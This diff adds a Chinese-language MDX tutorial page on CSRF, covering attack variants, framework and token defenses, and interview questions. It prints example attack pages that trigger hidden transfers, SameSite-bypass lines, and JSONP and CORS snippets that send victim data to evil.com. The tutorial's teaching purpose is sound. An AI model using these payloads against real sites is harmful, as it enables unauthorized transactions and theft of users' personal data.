@@ -1,0 +1,552 @@
+import {
+  Card,
+  Table,
+  Tag,
+  Typography,
+  Alert,
+  Collapse,
+  List,
+  Steps,
+  Tabs,
+  Divider,
+} from 'antd';
+import { csrfScenarios, scenarioColumns, csrfDefenses, defenseColumns } from './data';
+import CodeBlock from '@/components/CodeBlock';
+
+# CSRF 跨站请求伪造深度解析
+
+> CSRF（Cross-Site Request Forgery）利用的是**浏览器对站点的「无条件信任」**——每个请求自动携带 Cookie。攻击者不需要窃取你的密码，只需要让你在不知情的情况下"自愿"发起一个请求。
+
+<Alert
+  message="一句话理解 CSRF"
+  description="你在 bank.com 登录后，浏览器中存了你的 Session Cookie。此时你访问了 evil.com，evil.com 上的恶意代码向 bank.com 发起了一个转账请求——浏览器自动携带了你的 Cookie，bank.com 收到请求后发现「这个请求带着合法的 Session」，于是执行了操作。你什么都没做，钱就没了。"
+  type="error"
+  showIcon
+  style={{ marginBottom: 24 }}
+/>
+
+---
+
+## 一、CSRF 攻击场景全景
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Paragraph>
+    下表覆盖了 <strong>{csrfScenarios.length} 种 CSRF 攻击场景</strong>，从最简单的 GET 型到最隐蔽的 Login CSRF：
+  </Typography.Paragraph>
+
+  <Table
+    dataSource={csrfScenarios}
+    columns={scenarioColumns}
+    pagination={false}
+    size="small"
+    bordered
+    scroll={{ x: 1000 }}
+    rowKey="key"
+  />
+</Card>
+
+---
+
+## 二、CSRF 攻击三部曲
+
+<Tabs
+  style={{ marginBottom: 24 }}
+  defaultActiveKey="get"
+  items={[
+    {
+      key: 'get',
+      label: 'GET 型 CSRF',
+      children: (
+        <Card>
+          <Typography.Title level={4}>最简单的攻击 —— 一行 HTML</Typography.Title>
+          <Steps
+            size="small"
+            direction="vertical"
+            items={[
+              { title: '第一步：用户登录 bank.com', description: '浏览器收到并存储 bank.com 的 Session Cookie（包含用户认证凭证）。' },
+              { title: '第二步：用户访问恶意页面 evil.com', description: '可能是钓鱼邮件中的链接、被植入恶意广告的正常网站、或 XSS 感染的页面。' },
+              { title: '第三步：恶意页面自动发起请求', description: '`<img src="https://bank.com/transfer?to=hacker&amount=5000">`——浏览器加载 img 时自动向 bank.com 发送 GET 请求，并携带之前存储的 Cookie。' },
+              { title: '第四步：bank.com 执行操作', description: 'bank.com 收到请求，验证 Session 合法，执行转账。它无法区分这个请求是用户主动发的还是被恶意页面诱导的。' },
+            ]}
+          />
+
+          <Typography.Title level={5} style={{ marginTop: 24 }}>攻击页面完整代码</Typography.Title>
+          <CodeBlock language="html" code={`<!-- evil.com/csrf-attack.html -->
+<!DOCTYPE html>
+<html>
+<head><title>恭喜你中奖了！</title></head>
+<body>
+  <h1>🎉 恭喜！正在准备奖品，请稍候...</h1>
+
+  <!-- 受害者看不到的隐藏攻击 -->
+  <img src="https://bank.com/transfer?to=hacker_account&amount=10000"
+       style="display:none" />
+
+  <!-- 同时修改邮箱 -->
+  <img src="https://bank.com/settings/change-email?new=hacker@evil.com"
+       style="display:none" />
+</body>
+</html>`} />
+
+          <Alert
+            message="关键教训"
+            description="永远不要在 GET 请求中执行状态变更操作（转账、删除、修改设置）。GET 请求应该只用于读取数据（遵循 RESTful 规范）。这是一条最基本的安全法则。"
+            type="warning"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+    {
+      key: 'post',
+      label: 'POST 型 CSRF',
+      children: (
+        <Card>
+          <Typography.Title level={4}>稍微复杂但仍然极易实现</Typography.Title>
+          <Typography.Paragraph>
+            POST 请求不能通过 img 标签发起，但可以通过<strong>自动提交的 form 表单</strong>实现。只需一个隐藏 form + 一行 JS。
+          </Typography.Paragraph>
+
+          <CodeBlock language="html" code={`<!-- evil.com/csrf-post-attack.html -->
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>页面加载中...</h1>
+
+  <form id="csrfForm" action="https://bank.com/api/transfer"
+        method="POST" style="display:none">
+    <input type="hidden" name="to_account" value="hacker_account_12345">
+    <input type="hidden" name="amount" value="10000">
+    <input type="hidden" name="currency" value="USD">
+  </form>
+
+  <script>
+    // 页面加载后立即提交，浏览器自动携带 bank.com 的 Cookie
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>`} />
+
+          <Alert
+            message="为什么 Cookie 被自动携带了？"
+            description="浏览器的 Cookie 机制设计为：无论请求来源是什么（用户点击链接、img 加载、form 提交、fetch 请求），只要请求的目标域与 Cookie 的 Domain 匹配，浏览器就会自动在请求头中附带该 Cookie。这个设计的初衷是方便用户（不用每次请求都登录），但也成了 CSRF 攻击的基础。"
+            type="info"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+    {
+      key: 'advanced',
+      label: 'JSONP 劫持 & CORS 绕过',
+      children: (
+        <Card>
+          <Typography.Title level={4}>JSONP 劫持 —— CSRF 的数据窃取变体</Typography.Title>
+          <Typography.Paragraph>
+            传统 CSRF 只能发起请求，不能读取响应（受同源策略限制）。但 JSONP 接口天然无同源保护——通过 script 标签加载后，回调函数中就能拿到数据。
+          </Typography.Paragraph>
+
+          <CodeBlock language="html" code={`<!-- JSONP 劫持攻击页面 -->
+<script>
+  // 定义与目标 JSONP 接口同名的回调函数
+  function getUserInfo(data) {
+    // data 包含用户的敏感信息（因为请求携带了 Cookie）
+    new Image().src = 'https://evil.com/steal?info='
+      + encodeURIComponent(JSON.stringify(data));
+  }
+</script>
+<!-- 跨域加载 JSONP 接口 —— 浏览器自动携带 Cookie -->
+<script src="https://bank.com/api/user/profile?callback=getUserInfo"></script>
+
+<!-- bank.com 响应（JSONP 格式）：
+getUserInfo({"name":"张三","idCard":"3301xxx","balance":52300});
+→ 回调函数执行 → 敏感数据发往 evil.com                -->`} />
+
+          <Divider />
+
+          <Typography.Title level={4}>CORS 配置错误利用 —— 最致命的 CSRF 变体</Typography.Title>
+          <Typography.Paragraph>
+            传统 CSRF 最大限制是攻击者不能读取响应。但 CORS 配置错误让这个限制完全消失。
+          </Typography.Paragraph>
+
+          <CodeBlock language="javascript" code={`// 前提：bank.com 返回了错误的 CORS 头
+// Access-Control-Allow-Origin: https://evil.com (或动态反射 Origin)
+// Access-Control-Allow-Credentials: true
+
+// 攻击者在 evil.com 上执行：
+fetch('https://bank.com/api/user/balance', {
+  credentials: 'include',  // 携带 Cookie！
+}).then(r => r.json())
+  .then(data => {
+    // 不仅能发起请求，还能读到响应数据！
+    fetch('https://evil.com/steal', {
+      method: 'POST', body: JSON.stringify(data),
+    });
+  });`} />
+
+          <Alert
+            message="核心差异"
+            description="传统 CSRF：只能「写」（发起请求），不能「读」（看响应）。CORS 配置错误 + CSRF：既能「写」也能「读」——等于完全绕过同源策略。因此 CORS 配置错误比纯粹的 CSRF 漏洞严重得多。"
+            type="error"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+  ]}
+/>
+
+---
+
+## 三、特殊 CSRF 场景
+
+<Collapse
+  style={{ marginBottom: 24 }}
+  items={[
+    {
+      key: 'login-csrf',
+      label: <Typography.Text strong>Login CSRF —— 让用户以为在自己的账户，实际在攻击者的账户</Typography.Text>,
+      children: (
+        <>
+          <Typography.Paragraph>
+            Login CSRF 的攻击目标不是窃取凭证，而是<strong>让用户使用攻击者账号登录</strong>。用户后续所有操作（搜索记录、浏览历史、输入的个人信息）都关联到攻击者账号。
+          </Typography.Paragraph>
+
+          <Steps
+            size="small"
+            direction="vertical"
+            items={[
+              { title: '攻击者准备', description: '用自己的账号登录 bank.com 获取 Session。创建自动提交的登录表单，预填自己的账号密码，action 指向 bank.com/login。' },
+              { title: '诱导用户访问', description: '通过钓鱼邮件/广告诱导访问 evil.com。evil.com 上的隐藏表单自动向 bank.com/login 提交，将用户登录为攻击者账号。' },
+              { title: '用户不知情操作', description: '用户以为在操作自己的账户（展示的是攻击者用户名但用户可能不注意），输入信用卡号、身份证号等敏感信息。' },
+              { title: '数据泄露', description: '所有用户输入都存储在攻击者账户中，攻击者登录后即可查看。Google 登录页面曾在 2011 年被发现存在此类漏洞。' },
+            ]}
+          />
+
+          <Alert
+            message="防御 Login CSRF"
+            description="1. 登录接口也需要 CSRF Token 保护。2. 登录成功后必须轮换 Session ID（防 Session Fixation）。3. 登录页面使用 SameSite=Strict Cookie。4. 检测异常登录模式（短时间内同账号从大量不同 IP 登录）。"
+            type="info"
+            showIcon
+          />
+        </>
+      ),
+    },
+    {
+      key: 'samesite-bypass',
+      label: <Typography.Text strong>SameSite 绕过 —— 顶级导航 GET 请求的「漏洞」</Typography.Text>,
+      children: (
+        <>
+          <Typography.Paragraph>
+            SameSite=Lax（Chrome 默认）在顶级导航 GET 请求中仍携带 Cookie。如果应用在 GET 中执行状态变更，SameSite=Lax 完全无法防御。
+          </Typography.Paragraph>
+
+          <Typography.Title level={5}>可绕过 SameSite=Lax 的攻击方式</Typography.Title>
+          <List
+            dataSource={[
+              '<a href="https://bank.com/delete-account">点击领取 iPhone 15</a>',
+              'window.open("https://bank.com/transfer?to=hacker&amount=5000")',
+              '<meta http-equiv="refresh" content="0;url=https://bank.com/transfer?to=hacker">',
+            ]}
+            renderItem={(item) => <List.Item><Tag color="red">绕过 Lax</Tag> <Typography.Text code>{item}</Typography.Text></List.Item>}
+          />
+
+          <Alert
+            message="防御"
+            description="1. 严格遵循 RESTful：GET 不做状态变更。2. 对所有状态变更操作添加 CSRF Token。3. 结合 Origin/Referer 校验。4. 敏感操作使用 SameSite=Strict。"
+            type="warning"
+            showIcon
+          />
+        </>
+      ),
+    },
+  ]}
+/>
+
+---
+
+## 四、防御方案对比
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Paragraph>
+    <strong>没有完美的单一防御方案。</strong>CSRF 同样需要纵深防御：
+  </Typography.Paragraph>
+
+  <Table
+    dataSource={csrfDefenses}
+    columns={defenseColumns}
+    pagination={false}
+    size="small"
+    bordered
+    scroll={{ x: 1100 }}
+    rowKey="key"
+  />
+</Card>
+
+---
+
+## 五、实战防御实现
+
+<Tabs
+  style={{ marginBottom: 24 }}
+  defaultActiveKey="backend"
+  items={[
+    {
+      key: 'backend',
+      label: '后端实现',
+      children: (
+        <Card>
+          <Typography.Title level={5}>Synchronizer Token Pattern（Express.js）</Typography.Title>
+          <CodeBlock language="javascript" code={`// ── 1. 生成和验证 CSRF Token 中间件 ──
+const crypto = require('crypto');
+
+app.use((req, res, next) => {
+  if (!req.session.csrfToken) {
+    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
+  }
+  res.locals.csrfToken = req.session.csrfToken;
+  next();
+});
+
+function csrfProtection(req, res, next) {
+  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
+  const token = req.body._csrf || req.headers['x-csrf-token'];
+  if (!token || token !== req.session.csrfToken) {
+    return res.status(403).json({ error: 'CSRF token 验证失败' });
+  }
+  next();
+}
+
+app.post('/api/transfer', csrfProtection, transferHandler);
+app.put('/api/settings', csrfProtection, settingsHandler);`} />
+
+          <Typography.Title level={5} style={{ marginTop: 24 }}>前端表单嵌入 Token</Typography.Title>
+          <CodeBlock language="html" code={`<!-- SSR（EJS/Pug）：表单中嵌入隐藏字段 -->
+<form action="/api/transfer" method="POST">
+  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+  <input name="amount" type="number">
+  <button>转账</button>
+</form>
+
+<!-- SPA（React）：AJAX 通过 Header 发送 -->
+<script>
+  const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
+  fetch('/api/transfer', {
+    method: 'POST',
+    headers: { 'X-CSRF-Token': csrfToken },
+    body: JSON.stringify({ to: 'xxx', amount: 1000 }),
+  });
+</script>`} />
+
+          <Alert
+            message="危险做法：把 Token 放在 Cookie 里"
+            description="不要将 CSRF Token 存在 Cookie 中让浏览器自动发送——这就失去了 CSRF Token 的意义（Cookie 会被跨站请求自动携带）。Token 应该放在请求体、请求头或 URL 参数中。"
+            type="warning"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+    {
+      key: 'spa',
+      label: 'SPA 实现',
+      children: (
+        <Card>
+          <Typography.Title level={5}>Header Token 模式 —— SPA 推荐方案</Typography.Title>
+          <Typography.Paragraph>
+            SPA 通常使用 JWT Token。推荐将 CSRF Token 存 localStorage，通过自定义 Header 发送。
+          </Typography.Paragraph>
+
+          <CodeBlock language="typescript" code={`// utils/api.ts —— fetch 拦截器自动添加 CSRF Header
+const CSRF_KEY = 'csrf_token';
+
+function getCsrfToken(): string {
+  let token = localStorage.getItem(CSRF_KEY);
+  if (!token) {
+    fetch('/api/csrf-token', { credentials: 'include' })
+      .then(r => r.json())
+      .then(({ token }) => localStorage.setItem(CSRF_KEY, token));
+  }
+  return token || '';
+}
+
+async function apiFetch(url: string, options: RequestInit = {}) {
+  const headers = new Headers(options.headers);
+  if (!['GET', 'HEAD', 'OPTIONS'].includes(options.method || 'GET')) {
+    headers.set('X-CSRF-Token', getCsrfToken());
+  }
+  return fetch(url, { ...options, credentials: 'include', headers });
+}
+
+await apiFetch('/api/transfer', {
+  method: 'POST',
+  body: JSON.stringify({ to: 'xxx', amount: 1000 }),
+});`} />
+
+          <Alert
+            message="SPA CSRF 防护关键点"
+            description="1. Token 存 localStorage 而非 Cookie——防跨站请求自动携带。2. 通过自定义 Header 发送——跨站请求无法添加自定义头（CORS preflight 保护）。3. 只对 POST/PUT/DELETE 做 Token 校验。"
+            type="info"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+    {
+      key: 'framework',
+      label: '框架内置方案',
+      children: (
+        <Card>
+          <Typography.Title level={5}>各框架的 CSRF 内置支持</Typography.Title>
+
+          <CodeBlock language="javascript" code={`// ═══ Next.js (App Router) ═══
+// Server Actions 自动包含 CSRF 防护
+// 请求中的 'next-action' header 跨站请求无法伪造
+
+// ═══ Express + csurf ═══
+const csurf = require('csurf');
+app.use(csurf({ cookie: true }));
+app.get('/form', (req, res) => {
+  res.render('form', { csrfToken: req.csrfToken() });
+});
+
+// ═══ Laravel (PHP) ═══
+// Blade 模板：@csrf → <input type="hidden" name="_token" value="...">
+// 所有 POST/PUT/DELETE 自动校验
+
+// ═══ Django (Python) ═══
+// 内置 CsrfViewMiddleware
+// 模板：{% csrf_token %}
+// AJAX：Header X-CSRFToken
+
+// ═══ Ruby on Rails ═══
+// 内置 protect_from_forgery
+// 所有非 GET 请求自动校验 authenticity_token`} />
+
+          <Alert
+            message="重要提醒"
+            description="框架提供了内置 CSRF 防护，但很多开发者会为了方便「禁用它」——不要这样做。如果某 API 确实不需要 CSRF 保护（如第三方回调的公开 Webhook），应使用 API Key + HMAC 签名代替。"
+            type="warning"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+  ]}
+/>
+
+---
+
+## 六、面试高频考点
+
+<Collapse
+  style={{ marginBottom: 24 }}
+  items={[
+    {
+      key: '1',
+      label: 'XSS 和 CSRF 的核心区别？为什么 CSRF Token 防 CSRF 但不防 XSS？',
+      children: (
+        <>
+          <Typography.Paragraph>
+            <strong>攻击目标：</strong>XSS 攻击<strong>受害者浏览器</strong>（注入脚本），CSRF 攻击<strong>Web 服务器</strong>（伪造请求）。<br />
+            <strong>利用机制：</strong>XSS 利用<strong>站点对用户输入的信任</strong>，CSRF 利用<strong>站点对浏览器的信任</strong>（自动携带 Cookie）。<br />
+            <strong>攻击结果：</strong>XSS 可读取 DOM、键盘记录、修改页面内容——做到 CSRF 做不到的事。CSRF 只能发请求，无法读响应（除非配合 CORS 错误）。<br /><br />
+            <strong>为什么 CSRF Token 防 CSRF 但不防 XSS？</strong><br />
+            CSRF Token 防御前提是<strong>攻击者无法获取 Token</strong>。CSRF 攻击中攻击者只能让浏览器发请求，无法读页面内容（同源策略）。但 XSS 可以在页面中执行 JS——读取 DOM 中的隐藏字段、localStorage 中的 Token、直接发起带 Token 的任意请求。<strong>XSS 可绕过所有 CSRF 防御。</strong>
+          </Typography.Paragraph>
+        </>
+      ),
+    },
+    {
+      key: '2',
+      label: 'SameSite Cookie 三个值的安全效果对比',
+      children: (
+        <>
+          <Table
+            dataSource={[
+              { key: '1', value: 'Strict', csrf: '✅ 完全防御', getLink: '❌ 链接不携带', ux: '⚠️ 差', useCase: '银行、支付、内部系统' },
+              { key: '2', value: 'Lax', csrf: '⚠️ 不防 GET CSRF', getLink: '✅ 链接携带', ux: '✅ 好', useCase: '大多数 Web 应用（Chrome 默认）' },
+              { key: '3', value: 'None', csrf: '❌ 完全不防', getLink: '✅ 全部携带', ux: '✅ 最好', useCase: '跨站嵌入场景（必须配 Secure）' },
+            ]}
+            columns={[
+              { title: '值', dataIndex: 'value', key: 'value', width: 80, render: (v) => <Tag color={v === 'Strict' ? 'red' : v === 'Lax' ? 'blue' : 'volcano'}>{v}</Tag> },
+              { title: 'CSRF 防护', dataIndex: 'csrf', key: 'csrf', width: 140 },
+              { title: 'GET 导航', dataIndex: 'getLink', key: 'getLink', width: 120 },
+              { title: '体验', dataIndex: 'ux', key: 'ux', width: 70 },
+              { title: '适用场景', dataIndex: 'useCase', key: 'useCase', width: 220 },
+            ]}
+            pagination={false}
+            size="small"
+            bordered
+          />
+          <Alert
+            message="最佳实践"
+            description="SameSite=Lax + CSRF Token + Origin 校验 + 二次验证（敏感操作）= 四层防御。SameSite 永远不应作为唯一 CSRF 防线。"
+            type="info"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </>
+      ),
+    },
+    {
+      key: '3',
+      label: 'SPA（React/Vue）中不需要 CSRF Token？这是一个陷阱问题',
+      children: (
+        <Typography.Paragraph>
+          <strong>正确答案：SPA 同样需要 CSRF 防护。</strong><br /><br />
+          有人说“SPA 用 Authorization Header + JWT，不用 Cookie，所以无 CSRF 风险”——<strong>部分正确但过于简化</strong>：<br /><br />
+          1. 如果 API 认证用 <Typography.Text code>{'Authorization: Bearer <jwt>'}</Typography.Text> + JWT 存 localStorage，浏览器不会在跨站请求中自动发送——确实无传统 CSRF 风险。<br />
+          2. 但很多 SPA 同时用了 Cookie（如 Refresh Token 存 httpOnly Cookie），此时 CSRF 风险仍存在。<br />
+          3. SPA 常用的「Double Submit Cookie」模式——Cookie 存一份 Token + Header 发一份——也是 CSRF 防御。<br /><br />
+          <strong>结论：</strong>「需不需要 CSRF Token」取决于<strong>认证方式</strong>，不取决于是否是 SPA。<Typography.Text code>Authorization: Bearer Token</Typography.Text> → 不需要。<Typography.Text code>Cookie-based Session</Typography.Text> → 需要。混合模式（Access Token 内存 + Refresh Token httpOnly Cookie）→ 需要保护 Refresh Token 端点。
+        </Typography.Paragraph>
+      ),
+    },
+    {
+      key: '4',
+      label: 'Double Submit Cookie 为什么安全？攻击者不能同时伪造 Cookie 和请求参数？',
+      children: (
+        <Typography.Paragraph>
+          Double Submit Cookie 安全性基于<strong>同源策略对 Cookie 的写入限制</strong>：<br /><br />
+          1. evil.com <strong>可携带</strong> bank.com 的 Cookie（浏览器自动行为）——但无法读取或写入。<br />
+          2. evil.com <strong>不可写入</strong> bank.com 域的 Cookie——只有 bank.com 自己的页面可以设置自己的 Cookie。<br />
+          3. evil.com <strong>不可读取</strong> bank.com 域的 Cookie——document.cookie 只能读当前域的 Cookie。<br />
+          4. 因此攻击者无法知道 bank.com Cookie 中 CSRF Token 的值，无法在请求参数中放入正确的值。<br /><br />
+          <strong>攻击者尝试：</strong>`document.cookie = "csrf_token=xxx; domain=bank.com"` → <strong>浏览器拒绝！</strong>不同源不能设置其他域的 Cookie。<br /><br />
+          <strong>子域接管风险：</strong>若攻击者控制 `evil.bank.com`，可为 `.bank.com` 写 Cookie → Double Submit Cookie 不再安全 → 需回退到 Synchronizer Token。
+        </Typography.Paragraph>
+      ),
+    },
+    {
+      key: '5',
+      label: '如何防御 JSONP 劫持？',
+      children: (
+        <>
+          <Steps
+            size="small"
+            direction="vertical"
+            items={[
+              { title: '彻底方案：废弃 JSONP，改用 CORS + Fetch', description: 'JSONP 本质是绕过同源策略的 hack。改用 CORS + 严格白名单是最安全的做法。' },
+              { title: '过渡方案：校验 Referer/Origin', description: '服务端在 JSONP 响应前检查请求的 Referer/Origin 是否来自信任域。能阻挡大多数攻击。' },
+              { title: '最严格：CSRF Token 做 URL 参数', description: 'JSONP 接口要求 URL 中传入有效 CSRF Token。script 标签加载无法动态构造 URL 参数。' },
+              { title: '数据损控：敏感数据不通过 JSONP 返回', description: 'JSONP 只返回公开数据（配置、字典），永远不返回个人信息、Token、余额。' },
+            ]}
+          />
+        </>
+      ),
+    },
+  ]}
+/>
+
+---
+
+<Typography.Paragraph type="secondary" style={{ textAlign: 'center' }}>
+  CSRF 的核心教训：<strong>浏览器不区分请求来源</strong>——它只管请求的目标。防护的核心思路是给请求加一个「攻击者无法预测的值」，让服务端区分「真实用户请求」和「伪造请求」。
+</Typography.Paragraph>
